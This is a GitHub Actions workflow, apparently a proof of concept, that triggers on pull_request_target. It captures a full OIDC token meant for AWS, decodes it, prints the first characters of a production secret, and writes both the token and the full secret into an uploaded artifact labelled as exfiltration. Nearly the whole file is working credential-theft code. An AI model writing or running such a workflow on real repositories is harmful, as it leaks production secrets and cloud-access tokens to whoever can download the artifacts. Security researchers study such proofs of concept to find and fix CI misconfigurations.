name: OIDC PR Target Full Token
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  oidc-full-token:
    runs-on: ubuntu-latest
    environment: production
    env:
      PROD_SECRET: ${{ secrets.PROD_SECRET }}
    steps:
      - name: Capture OIDC JWT
        run: |
          FULL_JWT=$(curl -sS \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$FULL_JWT" > /tmp/oidc_token.txt
          PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
          echo "$PAYLOAD" | python3 -c "
          import sys, base64, json
          d = sys.stdin.read().strip()
          p = d + '=' * (4 - len(d) % 4)
          print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))"
      - name: Show environment secret value
        run: |
          echo "Secret length: ${#PROD_SECRET}"
          echo "Secret starts with: ${PROD_SECRET:0:4}"
          echo "$PROD_SECRET" > /tmp/secret_exfil.txt
          echo "Full secret exfiltrated to artifact"
      - uses: actions/upload-artifact@v4
        with:
          name: oidc-secret-poc
          path: |
            /tmp/oidc_token.txt
            /tmp/secret_exfil.txt
          retention-days: 1
